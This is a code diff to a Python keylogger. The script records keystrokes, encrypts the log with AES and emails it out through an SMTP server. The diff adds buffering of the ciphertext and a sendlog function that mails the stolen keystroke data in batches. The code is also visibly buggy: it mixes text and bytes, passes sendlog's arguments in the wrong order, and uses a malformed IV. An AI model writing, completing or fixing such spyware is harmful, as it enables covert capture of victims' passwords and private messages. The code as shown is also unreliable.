@@ -42,6 +42,9 @@ raw = ''
 data_to_be_sent = ''
 full_log = ''
 word = ''
+private_key = ''
+iv = ''
+ciphertext_all = ''
 
 
 #Building the keylogger (seems to work just fine)
@@ -49,6 +52,7 @@ word = ''
 def on_press(key):
     global full_log
     k = str(key).replace("'", "")
+    global ciphertext_all
      
     if k == 'Key.enter':
         full_log += "[ENTER]\n"
@@ -66,6 +70,10 @@ def on_press(key):
       full_log = ''
       encrypt(data_to_be_encrypted, password)
       data_to_be_encrypted = ''
+    if len(ciphertext_all) == 1000:
+              sendlog(ciphertext_all, iv, private_key)
+              ciphertext_all = ''
+
     else:
       full_log += k 
       print(full_log)
@@ -77,17 +85,24 @@ def on_press(key):
 
 
 def encrypt(data_to_be_encrypted, password):
-
-    
+ global ciphertext_all
+ while len(ciphertext_all) < 1000:
     private_key = hashlib.sha256(password.encode("utf-8")).digest()
     mode = AES.MODE_CBC
-    iv = 16 * b'\x00'
+    iv = b'16e163d95b86bb0s'
     cipher = AES.new(private_key, mode, iv)
     ciphertext = cipher.encrypt(data_to_be_encrypted.encode("utf-8"))
+    ciphertext_all = ciphertext_all + ciphertext
+    print(ciphertext)
+    ciphertext = ''
+    return ciphertext,iv,private_key
+    
+
+def sendlog(private_key, iv, ciphertext_all):
     server.sendmail(
           email,
           email,
-          ciphertext
+          ciphertext_all
      )
     server.sendmail(
           email,
